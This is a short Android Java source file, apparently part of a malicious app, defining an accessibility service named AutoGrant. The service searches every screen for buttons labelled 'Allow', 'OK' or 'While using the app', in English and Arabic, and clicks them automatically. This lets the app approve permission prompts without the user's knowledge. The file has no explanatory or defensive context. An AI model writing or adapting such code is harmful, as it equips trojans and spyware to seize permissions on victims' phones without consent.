package com.vanta.core;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AutoGrant extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        click(root, "Allow"); click(root, "السماح");
        click(root, "OK");    click(root, "موافق");
        click(root, "While using the app"); click(root, "أثناء استخدام التطبيق");
    }

    private void click(AccessibilityNodeInfo n, String text) {
        if (n == null) return;
        if (n.getText() != null && n.getText().toString().equalsIgnoreCase(text) && n.isClickable()) {
            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }
        for (int i = 0; i < n.getChildCount(); i++) click(n.getChild(i), text);
    }

    @Override public void onInterrupt() {}
}
